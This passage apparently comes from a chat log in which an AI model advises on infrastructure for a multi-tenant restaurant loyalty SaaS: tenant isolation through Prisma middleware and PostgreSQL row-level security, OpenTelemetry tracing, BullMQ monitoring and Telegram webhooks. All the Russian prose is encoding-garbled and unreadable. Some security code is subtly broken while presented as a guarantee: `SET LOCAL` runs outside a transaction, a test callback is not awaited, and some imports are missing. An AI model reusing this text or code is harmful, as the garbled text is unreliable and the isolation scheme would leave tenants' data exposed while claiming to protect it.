‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îÇ   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                                ‚îÇ                 ‚îÇ
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê           ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  NEON.TECH     ‚îÇ           ‚îÇ  UPSTASH        ‚îÇ  ‚îÇ CLOUDFLARE   ‚îÇ
‚îÇ  PostgreSQL    ‚îÇ           ‚îÇ  Redis          ‚îÇ  ‚îÇ R2 Storage   ‚îÇ
‚îÇ                ‚îÇ           ‚îÇ                 ‚îÇ  ‚îÇ              ‚îÇ
‚îÇ - 3 GB storage ‚îÇ           ‚îÇ - 10k cmd/day   ‚îÇ  ‚îÇ - 10 GB      ‚îÇ
‚îÇ - Point-in-time‚îÇ           ‚îÇ - 256 MB RAM    ‚îÇ  ‚îÇ - Unlimited  ‚îÇ
‚îÇ   recovery     ‚îÇ           ‚îÇ - Global CDN    ‚îÇ  ‚îÇ   bandwidth  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò           ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    EXTERNAL SERVICES                             ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ - Resend (Email): 3,000 emails/–º–µ—Å—è—Ü                           ‚îÇ
‚îÇ - SMS.RU (SMS): Pay-as-you-go                                  ‚îÇ
‚îÇ - Better Stack (Monitoring): 1 GB logs/–º–µ—Å—è—Ü                   ‚îÇ
‚îÇ - GitHub Actions (CI/CD): 2,000 minutes/–º–µ—Å—è—Ü                  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

```

***

## üí∞ **–°–¢–û–ò–ú–û–°–¢–¨ –ò–ù–§–†–ê–°–¢–†–£–ö–¢–£–†–´:**

| –≠—Ç–∞–ø | –°–µ—Ä–≤–∏—Å—ã | –°—Ç–æ–∏–º–æ—Å—Ç—å |
|------|---------|-----------|
| **MVP (0-500 –≥–æ—Å—Ç–µ–π)** | –í—Å–µ free tier | **$0/–º–µ—Å** |
| **First Paying (500-2k)** | Fly.io RAM upgrade + Neon Scale | **~$30/–º–µ—Å** |
| **PMF (2k-10k)** | + Horizontal scaling + Upstash Pro | **~$90/–º–µ—Å** |
| **Scale (10k-50k)** | + Dedicated DB + K8s | **~$300/–º–µ—Å** |

***

## üéØ **–ö–õ–Æ–ß–ï–í–´–ï –î–û–°–¢–ò–ñ–ï–ù–ò–Ø:**

‚úÖ **Zero-cost MVP**: –ü–æ–ª–Ω–æ—Å—Ç—å—é —Ä–∞–±–æ—á–∏–π production –Ω–∞ –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö —Ç–∞—Ä–∏—Ñ–∞—Ö  
‚úÖ **Production-ready**: 40+ –ø—É–Ω–∫—Ç–æ–≤ —á–µ–∫–ª–∏—Å—Ç–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–æ  
‚úÖ **Scalable**: –ß—ë—Ç–∫–∏–π –ø—É—Ç—å –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏—è 0 ‚Üí 50k –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π  
‚úÖ **Reliable**: Disaster recovery –ø–ª–∞–Ω –¥–ª—è –≤—Å–µ—Ö —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤  
‚úÖ **Secure**: Multi-layer security (Cloudflare + Backend + DB)  
‚úÖ **Observable**: –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥, –∞–ª–µ—Ä—Ç—ã, –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ  
‚úÖ **Automated**: CI/CD –ø–æ–ª–Ω–æ—Å—Ç—å—é –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω  
‚úÖ **Optimized**: –ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ, –∏–Ω–¥–µ–∫—Å—ã, connection pooling  

***

## üìù **–°–õ–ï–î–£–Æ–©–ò–ï –®–ê–ì–ò:**

1. ‚úÖ **Infrastructure & DevOps** - –ó–ê–í–ï–†–®–ï–ù–û (35 –≤–æ–ø—Ä–æ—Å–æ–≤)
2. ‚è≠Ô∏è **Testing Strategy** - –°–õ–ï–î–£–Æ–©–ò–ô –ë–õ–û–ö
   - Unit tests (Jest)
   - Integration tests (Supertest)
   - E2E tests (Playwright)
   - Load testing (k6)
   - Contract testing (POS webhooks)

3. ‚è≠Ô∏è **Deployment Automation**
   - GitHub Actions workflows (–ø–æ–ª–Ω—ã–µ)
   - Staging environment setup
   - Production deploy checklist

***

**–ì–æ—Ç–æ–≤ –ø–µ—Ä–µ–π—Ç–∏ –∫ Testing Strategy –∏–ª–∏ –Ω—É–∂–Ω–æ —á—Ç–æ-—Ç–æ –¥–æ–ø–æ–ª–Ω–∏—Ç—å –≤ Infrastructure?** üéØ


<div align="center">‚ÅÇ</div>

[^8_1]: Beseda-10.md

---

# –ù—É–∂–Ω–æ –µ—â–µ —á—Ç–æ-—Ç–æ –¥–æ–±–∞–≤–∏—Ç—å –ø–æ Infrastructure? –ü–æ–¥—É–º–∞–π —Ç—â–∞—Ç–µ–ª—å–Ω–æ –Ω–∞–¥ –ø—Ä–æ–µ–∫—Ç–æ–º

–û—Ç–ª–∏—á–Ω–æ, —á—Ç–æ —Ç—ã –ø–æ–ø—Ä–æ—Å–∏–ª –ø–µ—Ä–µ–ø—Ä–æ–≤–µ—Ä–∏—Ç—å! üîç –Ø —Ç—â–∞—Ç–µ–ª—å–Ω–æ –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–ª –ø—Ä–æ–µ–∫—Ç –∏ –Ω–∞—à—ë–ª **5 –ö–†–ò–¢–ò–ß–ù–´–• –ø—Ä–æ–±–µ–ª–æ–≤** –≤ Infrastructure, –∫–æ—Ç–æ—Ä—ã–µ —è —É–ø—É—Å—Ç–∏–ª:

***

# üö® **–ö–†–ò–¢–ò–ß–ù–´–ï –î–û–ü–û–õ–ù–ï–ù–ò–Ø –ö INFRASTRUCTURE**

## **3Ô∏è‚É£6Ô∏è‚É£ Multi-tenancy Row-Level Security: –ö–∞–∫ –∏–∑–æ–ª–∏—Ä–æ–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–µ —Ç–µ–Ω–∞–Ω—Ç–æ–≤?**

**–í–û–ü–†–û–°:** –≠—Ç–æ **multi-tenant SaaS**. –ö–∞–∫ –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å —á—Ç–æ Tenant A –ù–ò–ö–û–ì–î–ê –Ω–µ —É–≤–∏–¥–∏—Ç –¥–∞–Ω–Ω—ã–µ Tenant B –¥–∞–∂–µ –ø—Ä–∏ SQL injection –∏–ª–∏ –±–∞–≥–µ?

**–ü–†–û–ë–õ–ï–ú–ê:**
```typescript
// ‚ùå –û–ü–ê–°–ù–û: –ó–∞–±—ã–ª–∏ –¥–æ–±–∞–≤–∏—Ç—å tenantId
const guests = await prisma.guest.findMany({
  where: {
    // –ë–µ–∑ tenantId –≤–µ—Ä–Ω—ë—Ç –í–°–ï –≥–æ—Å—Ç–∏ –≤—Å–µ—Ö —Ç–µ–Ω–∞–Ω—Ç–æ–≤!
  }
});
```

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: 3-layer security**

### **Layer 1: Prisma Middleware (–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–π tenantId)**

```typescript
// apps/backend/src/database/prisma.service.ts
import { Injectable, OnModuleInit } from '@nestjs/common';
import { PrismaClient } from '@prisma/client';
import { AsyncLocalStorage } from 'async_hooks';

// Context –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Ç–µ–∫—É—â–µ–≥–æ tenantId
export const tenantContext = new AsyncLocalStorage<{
  tenantId: string;
  userId: string;
}>();

@Injectable()
export class PrismaService extends PrismaClient implements OnModuleInit {
  async onModuleInit() {
    await this.$connect();
    
    // Middleware: –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–ª—è–µ—Ç tenantId –∫–æ –≤—Å–µ–º –∑–∞–ø—Ä–æ—Å–∞–º
    this.$use(async (params, next) => {
      const ctx = tenantContext.getStore();
      
      if (!ctx?.tenantId) {
        // CRITICAL: –ó–∞–ø—Ä–æ—Å –±–µ–∑ tenantId - –±–ª–æ–∫–∏—Ä—É–µ–º!
        throw new Error('SECURITY: tenantId is required for all queries');
      }

      // –ú–æ–¥–µ–ª–∏ –∫–æ—Ç–æ—Ä—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å tenant-scoped
      const tenantModels = [
        'Guest',
        'GuestCard',
        'BallTransaction',
        'LoyaltyRule',
        'Promo',
        'POSTransaction',
        'Restaurant',
      ];

      if (tenantModels.includes(params.model)) {
        // READ –æ–ø–µ—Ä–∞—Ü–∏–∏
        if (params.action === 'findUnique' || params.action === 'findFirst') {
          params.args.where = {
            ...params.args.where,
            tenantId: ctx.tenantId,
          };
        }

        if (params.action === 'findMany') {
          if (!params.args) params.args = {};
          params.args.where = {
            ...params.args.where,
            tenantId: ctx.tenantId,
          };
        }

        // WRITE –æ–ø–µ—Ä–∞—Ü–∏–∏
        if (params.action === 'create') {
          params.args.data = {
            ...params.args.data,
            tenantId: ctx.tenantId,
          };
        }

        if (params.action === 'createMany') {
          params.args.data = params.args.data.map((item) => ({
            ...item,
            tenantId: ctx.tenantId,
          }));
        }

        if (params.action === 'update' || params.action === 'updateMany') {
          params.args.where = {
            ...params.args.where,
            tenantId: ctx.tenantId,
          };
        }

        if (params.action === 'delete' || params.action === 'deleteMany') {
          params.args.where = {
            ...params.args.where,
            tenantId: ctx.tenantId,
          };
        }
      }

      return next(params);
    });
  }
}
```


### **Layer 2: Request Context Interceptor**

```typescript
// common/interceptors/tenant-context.interceptor.ts
import { Injectable, NestInterceptor, ExecutionContext, CallHandler } from '@nestjs/common';
import { Observable } from 'rxjs';
import { tenantContext } from '@/database/prisma.service';

@Injectable()
export class TenantContextInterceptor implements NestInterceptor {
  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {
    const request = context.switchToHttp().getRequest();
    const user = request.user; // –ò–∑ JWT

    if (!user?.tenantId) {
      throw new UnauthorizedException('Tenant context required');
    }

    // –°–æ—Ö—Ä–∞–Ω—è–µ–º tenantId –≤ AsyncLocalStorage
    return new Observable((subscriber) => {
      tenantContext.run(
        {
          tenantId: user.tenantId,
          userId: user.id,
        },
        () => {
          next.handle().subscribe(subscriber);
        },
      );
    });
  }
}
```

**–ü—Ä–∏–º–µ–Ω—è–µ–º –≥–ª–æ–±–∞–ª—å–Ω–æ:**

```typescript
// main.ts
app.useGlobalInterceptors(new TenantContextInterceptor());
```


### **Layer 3: PostgreSQL Row-Level Security (RLS)**

```sql
-- –í–∫–ª—é—á–∞–µ–º RLS –Ω–∞ –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö —Ç–∞–±–ª–∏—Ü–∞—Ö
ALTER TABLE "Guest" ENABLE ROW LEVEL SECURITY;
ALTER TABLE "GuestCard" ENABLE ROW LEVEL SECURITY;
ALTER TABLE "BallTransaction" ENABLE ROW LEVEL SECURITY;

-- Policy: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –≤–∏–¥—è—Ç —Ç–æ–ª—å–∫–æ —Å–≤–æ–π tenant
CREATE POLICY tenant_isolation_policy ON "Guest"
  USING ("tenantId" = current_setting('app.current_tenant_id')::uuid);

CREATE POLICY tenant_isolation_policy ON "GuestCard"
  USING ("tenantId" = current_setting('app.current_tenant_id')::uuid);

CREATE POLICY tenant_isolation_policy ON "BallTransaction"
  USING ("tenantId" = current_setting('app.current_tenant_id')::uuid);

-- –í –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º tenant –ø–µ—Ä–µ–¥ –∫–∞–∂–¥—ã–º –∑–∞–ø—Ä–æ—Å–æ–º
-- prisma.$executeRaw`SET LOCAL app.current_tenant_id = ${tenantId}`;
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:**

```typescript
async getTenantGuests(tenantId: string) {
  // Set RLS context
  await this.prisma.$executeRaw`
    SET LOCAL app.current_tenant_id = ${tenantId}::uuid;
  `;

  // –¢–µ–ø–µ—Ä—å PostgreSQL –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Ñ–∏–ª—å—Ç—Ä—É–µ—Ç –ø–æ tenantId
  return this.prisma.guest.findMany();
}
```


### **Testing tenant isolation:**

```typescript
// tests/security/tenant-isolation.spec.ts
describe('Tenant Isolation Security', () => {
  it('should NOT allow tenant A to see tenant B data', async () => {
    // Create guest for tenant A
    const guestA = await createGuest({ tenantId: 'tenant-a' });

    // Try to access as tenant B (should fail)
    tenantContext.run({ tenantId: 'tenant-b', userId: 'user-b' }, async () => {
      const result = await prisma.guest.findUnique({
        where: { id: guestA.id },
      });

      expect(result).toBeNull(); // ‚úÖ Tenant B –Ω–µ –≤–∏–¥–∏—Ç –¥–∞–Ω–Ω—ã–µ tenant A
    });
  });

  it('should throw error if tenantId is missing', async () => {
    await expect(async () => {
      // No tenant context
      await prisma.guest.findMany();
    }).rejects.toThrow('tenantId is required');
  });
});
```


***

## **3Ô∏è‚É£7Ô∏è‚É£ Distributed Tracing (OpenTelemetry): –ö–∞–∫ –æ—Ç–ª–∞–∂–∏–≤–∞—Ç—å –ø—Ä–æ–±–ª–µ–º—ã –≤ production?**

**–í–û–ü–†–û–°:** –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∂–∞–ª—É–µ—Ç—Å—è: "–ë–∞–ª–ª—ã –Ω–µ –Ω–∞—á–∏—Å–ª–∏–ª–∏—Å—å". –ö–∞–∫ —É–≤–∏–¥–µ—Ç—å **–ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∑–∞–ø—Ä–æ—Å–∞** —á–µ—Ä–µ–∑ –≤—Å–µ —Å–µ—Ä–≤–∏—Å—ã?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: OpenTelemetry + Grafana Tempo (–±–µ—Å–ø–ª–∞—Ç–Ω–æ)**

```typescript
// apps/backend/src/tracing/tracing.ts
import { NodeSDK } from '@opentelemetry/sdk-node';
import { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node';
import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';
import { Resource } from '@opentelemetry/resources';
import { SemanticResourceAttributes } from '@opentelemetry/semantic-conventions';

const sdk = new NodeSDK({
  resource: new Resource({
    [SemanticResourceAttributes.SERVICE_NAME]: 'max-loyalty-backend',
    [SemanticResourceAttributes.SERVICE_VERSION]: process.env.APP_VERSION,
    [SemanticResourceAttributes.DEPLOYMENT_ENVIRONMENT]: process.env.NODE_ENV,
  }),
  
  traceExporter: new OTLPTraceExporter({
    url: process.env.OTEL_EXPORTER_OTLP_ENDPOINT || 'http://localhost:4318/v1/traces',
  }),
  
  instrumentations: [
    getNodeAutoInstrumentations({
      '@opentelemetry/instrumentation-http': {},
      '@opentelemetry/instrumentation-express': {},
      '@opentelemetry/instrumentation-pg': {}, // PostgreSQL
      '@opentelemetry/instrumentation-redis': {}, // Redis
      '@opentelemetry/instrumentation-prisma': {}, // Prisma (unofficial)
    }),
  ],
});

sdk.start();

// Graceful shutdown
process.on('SIGTERM', () => {
  sdk.shutdown().then(() => console.log('Tracing terminated'));
});
```

**–ö–∞—Å—Ç–æ–º–Ω—ã–µ spans:**

```typescript
// loyalty/loyalty.service.ts
import { trace } from '@opentelemetry/api';

@Injectable()
export class LoyaltyService {
  private tracer = trace.getTracer('loyalty-service');

  async processTransaction(dto: ProcessTransactionDto) {
    // –°–æ–∑–¥–∞—ë–º parent span
    return this.tracer.startActiveSpan('loyalty.processTransaction', async (span) => {
      span.setAttribute('tenant.id', dto.tenantId);
      span.setAttribute('guest.id', dto.guestId);
      span.setAttribute('check.amount', dto.checkAmount);

      try {
        // Child span 1: Get rules
        const rules = await this.tracer.startActiveSpan('loyalty.getRules', async (childSpan) => {
          const rules = await this.getLoyaltyRules(dto.tenantId);
          childSpan.setAttribute('rules.count', rules.length);
          childSpan.end();
          return rules;
        });

        // Child span 2: Calculate points
        const points = await this.tracer.startActiveSpan('loyalty.calculatePoints', async (childSpan) => {
          const points = this.calculatePoints(dto.checkAmount, rules);
          childSpan.setAttribute('points.earned', points);
          childSpan.end();
          return points;
        });

        // Child span 3: Credit points
        await this.tracer.startActiveSpan('loyalty.creditPoints', async (childSpan) => {
          await this.creditPoints(dto.guestId, points);
          childSpan.end();
        });

        span.setStatus({ code: SpanStatusCode.OK });
        return { success: true, points };
      } catch (error) {
        span.recordException(error);
        span.setStatus({ code: SpanStatusCode.ERROR, message: error.message });
        throw error;
      } finally {
        span.end();
      }
    });
  }
}
```

**Trace visualization –≤ Grafana:**

```
Trace ID: abc123def456
Duration: 245ms

‚îå‚îÄ POST /webhooks/transaction (245ms)
‚îÇ  ‚îú‚îÄ Verify HMAC signature (5ms) ‚úÖ
‚îÇ  ‚îú‚îÄ Parse webhook payload (2ms) ‚úÖ
‚îÇ  ‚îú‚îÄ Queue job (3ms) ‚úÖ
‚îÇ  ‚îî‚îÄ Return 200 OK
‚îÇ
‚îî‚îÄ Worker: process-webhook (230ms)
   ‚îú‚îÄ Identify guest (45ms)
   ‚îÇ  ‚îú‚îÄ Query PostgreSQL: Guest.findUnique (35ms)
   ‚îÇ  ‚îî‚îÄ Check Redis cache (10ms) ‚úÖ
   ‚îÇ
   ‚îú‚îÄ Get loyalty rules (50ms)
   ‚îÇ  ‚îú‚îÄ Check Redis cache (5ms) ‚ùå MISS
   ‚îÇ  ‚îî‚îÄ Query PostgreSQL: LoyaltyRule.findMany (45ms)
   ‚îÇ
   ‚îú‚îÄ Calculate points (15ms) ‚úÖ
   ‚îÇ
   ‚îú‚îÄ Credit points (80ms)
   ‚îÇ  ‚îú‚îÄ Begin transaction (2ms)
   ‚îÇ  ‚îú‚îÄ Update GuestCard.totalBalance (30ms)
   ‚îÇ  ‚îú‚îÄ Create BallTransaction (35ms)
   ‚îÇ  ‚îî‚îÄ Commit transaction (13ms)
   ‚îÇ
   ‚îî‚îÄ Send notification (40ms)
      ‚îú‚îÄ Queue notification job (5ms)
      ‚îî‚îÄ Telegram API call (35ms) ‚ö†Ô∏è SLOW
```

**Grafana Tempo (–±–µ—Å–ø–ª–∞—Ç–Ω–æ –Ω–∞ Grafana Cloud):**

```yaml
# docker-compose.yml (–ª–æ–∫–∞–ª—å–Ω–æ)
tempo:
  image: grafana/tempo:latest
  ports:
    - "4318:4318" # OTLP HTTP
    - "3200:3200" # Tempo UI
  command: ["-config.file=/etc/tempo.yaml"]
```


***

## **3Ô∏è‚É£8Ô∏è‚É£ Background Jobs Monitoring Dashboard (BullMQ Bull Board)**

**–í–û–ü–†–û–°:** Email/SMS/Webhooks –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è —á–µ—Ä–µ–∑ BullMQ –æ—á–µ—Ä–µ–¥–∏. –ö–∞–∫ –≤–∏–¥–µ—Ç—å —á—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –≤ production?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Bull Board UI + Prometheus metrics**

```typescript
// apps/backend/src/queues/queue.module.ts
import { Module } from '@nestjs/common';
import { BullModule } from '@nestjs/bullmq';
import { createBullBoard } from '@bull-board/api';
import { BullMQAdapter } from '@bull-board/api/bullMQAdapter';
import { ExpressAdapter } from '@bull-board/express';

@Module({
  imports: [
    BullModule.forRoot({
      connection: {
        host: process.env.REDIS_HOST,
        port: parseInt(process.env.REDIS_PORT),
      },
    }),
    
    // –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –æ—á–µ—Ä–µ–¥–∏
    BullModule.registerQueue(
      { name: 'notifications' },
      { name: 'pos-webhooks' },
      { name: 'loyalty-processing' },
      { name: 'emails' },
      { name: 'sms' },
    ),
  ],
})
export class QueueModule {
  static setupBullBoard(app: INestApplication) {
    const serverAdapter = new ExpressAdapter();
    serverAdapter.setBasePath('/admin/queues');

    const queues = [
      new BullMQAdapter(getQueueToken('notifications')),
      new BullMQAdapter(getQueueToken('pos-webhooks')),
      new BullMQAdapter(getQueueToken('loyalty-processing')),
      new BullMQAdapter(getQueueToken('emails')),
      new BullMQAdapter(getQueueToken('sms')),
    ];

    createBullBoard({
      queues,
      serverAdapter,
    });

    app.use('/admin/queues', serverAdapter.getRouter());
  }
}
```

**–í main.ts:**

```typescript
// main.ts
async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // Bull Board UI (—Ç–æ–ª—å–∫–æ –¥–ª—è Admin —Ä–æ–ª–∏)
  if (process.env.NODE_ENV !== 'production' || process.env.ENABLE_BULL_BOARD === 'true') {
    QueueModule.setupBullBoard(app);
    console.log('üìä Bull Board available at http://localhost:3000/admin/queues');
  }
  
  await app.listen(3000);
}
```

**Production access (–∑–∞—â–∏—â—ë–Ω –ø–∞—Ä–æ–ª–µ–º):**

```typescript
// admin/auth.guard.ts
app.use('/admin/queues', basicAuth({
  users: { 
    [process.env.ADMIN_USERNAME]: process.env.ADMIN_PASSWORD 
  },
  challenge: true,
}));
```

**Prometheus metrics –¥–ª—è –æ—á–µ—Ä–µ–¥–µ–π:**

```typescript
// queues/queue-metrics.service.ts
import { Injectable } from '@nestjs/common';
import { InjectQueue } from '@nestjs/bullmq';
import { Queue } from 'bullmq';
import { Gauge } from 'prom-client';
import { Cron, CronExpression } from '@nestjs/schedule';

const queueWaitingGauge = new Gauge({
  name: 'bullmq_queue_waiting',
  help: 'Number of jobs waiting in queue',
  labelNames: ['queue'],
});

const queueActiveGauge = new Gauge({
  name: 'bullmq_queue_active',
  help: 'Number of active jobs in queue',
  labelNames: ['queue'],
});

const queueFailedGauge = new Gauge({
  name: 'bullmq_queue_failed',
  help: 'Number of failed jobs in queue',
  labelNames: ['queue'],
});

@Injectable()
export class QueueMetricsService {
  constructor(
    @InjectQueue('notifications') private notificationsQueue: Queue,
    @InjectQueue('pos-webhooks') private posQueue: Queue,
    @InjectQueue('emails') private emailQueue: Queue,
  ) {}

  @Cron(CronExpression.EVERY_30_SECONDS)
  async collectMetrics() {
    const queues = [
      { name: 'notifications', queue: this.notificationsQueue },
      { name: 'pos-webhooks', queue: this.posQueue },
      { name: 'emails', queue: this.emailQueue },
    ];

    for (const { name, queue } of queues) {
      const counts = await queue.getJobCounts();
      
      queueWaitingGauge.set({ queue: name }, counts.waiting);
      queueActiveGauge.set({ queue: name }, counts.active);
      queueFailedGauge.set({ queue: name }, counts.failed);
    }
  }
}
```

**Grafana alert:**

```yaml
- alert: HighQueueBacklog
  expr: bullmq_queue_waiting{queue="pos-webhooks"} > 1000
  for: 5m
  annotations:
    summary: "High backlog in {{ $labels.queue }}"
    description: "{{ $labels.queue }} has {{ $value }} waiting jobs"
```


***

## **3Ô∏è‚É£9Ô∏è‚É£ Telegram Bot WebSocket Infrastructure**

**–í–û–ü–†–û–°:** Telegram Bot –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∞—Ç—å **—Å–æ—Ç–Ω–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ –º–∏–Ω—É—Ç—É**. –ö–∞–∫ –æ—Ä–≥–∞–Ω–∏–∑–æ–≤–∞—Ç—å –Ω–∞ Fly.io?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

- **A) Long polling** (–ø–æ—Å—Ç–æ—è–Ω–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ Telegram API)
- **B) Webhooks** (Telegram –ø—Ä–∏—Å—ã–ª–∞–µ—Ç POST –∑–∞–ø—Ä–æ—Å—ã)

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: B) Webhooks (–º–∞—Å—à—Ç–∞–±–∏—Ä—É–µ–º–æ)**

```typescript
// telegram/telegram.service.ts
import { Injectable, OnModuleInit } from '@nestjs/common';
import { Telegraf } from 'telegraf';

@Injectable()
export class TelegramService implements OnModuleInit {
  private bot: Telegraf;

  constructor() {
    this.bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
  }

  async onModuleInit() {
    if (process.env.NODE_ENV === 'production') {
      // Production: Webhooks
      const webhookUrl = `${process.env.API_URL}/webhooks/telegram`;
      
      await this.bot.telegram.setWebhook(webhookUrl, {
        drop_pending_updates: true,
        allowed_updates: ['message', 'callback_query'],
        max_connections: 40, // –î–æ 40 –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π
      });
      
      console.log(`‚úÖ Telegram webhook set to ${webhookUrl}`);
    } else {
      // Development: Long polling
      await this.bot.launch();
      console.log('‚úÖ Telegram bot started (long polling)');
    }
  }

  getWebhookMiddleware() {
    return this.bot.webhookCallback('/webhooks/telegram');
  }
}
```

**Webhook endpoint:**

```typescript
// telegram/telegram.controller.ts
import { Controller, Post, Req, Res } from '@nestjs/common';
import { Request, Response } from 'express';
import { TelegramService } from './telegram.service';

@Controller('webhooks/telegram')
export class TelegramController {
  constructor(private telegram: TelegramService) {}

  @Post()
  async handleWebhook(@Req() req: Request, @Res() res: Response) {
    // Telegram –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç POST —Å JSON payload
    await this.telegram.getWebhookMiddleware()(req, res);
  }
}
```

**Fly.io –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è:**

```toml
# fly.toml
[[services]]
  internal_port = 3000
  protocol = "tcp"

  # Telegram webhooks –º–æ–≥—É—Ç –ø—Ä–∏—Ö–æ–¥–∏—Ç—å –º–∞—Å—Å–æ–≤–æ
  [services.concurrency]
    type = "connections"
